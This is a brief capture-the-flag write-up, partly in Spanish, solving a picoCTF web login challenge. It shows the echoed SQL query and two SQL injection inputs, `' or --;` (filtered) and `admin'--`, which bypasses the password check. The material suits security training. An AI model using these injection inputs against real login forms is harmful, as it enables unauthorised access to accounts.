## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/53751/` ([link](https://jupiter.challenges.picoctf.org/problem/53751/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or [http://jupiter.challenges.picoctf.org:53751](http://jupiter.challenges.picoctf.org:53751)
## Solución
- Cuando intentamos ingresar nos muestra la sentencia SQL que utiliza.
```shell
username: admin
password: admin
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'
```

Al identificar el tipo de sentencia que se usa, volvemos al formulario e intentamos replicar lo que hicimos anteriormente. Sin embargo, parece que el sistema filtra lo que enviamos. Como sabemos que existe un usuario llamado "admin", modificamos su registro para obtener acceso, lo que finalmente nos permite ver la bandera.

```shell
username: ' or --;
password: admin
SQL query: SELECT * FROM users WHERE name='' or --;' AND password='admin'

# SQLi detected.

username: admin'--
password: admin
SQL query: SELECT * FROM users WHERE name='admin'--' AND password='admin'

# Logged in!
```

## Notas adicionales

## Referencias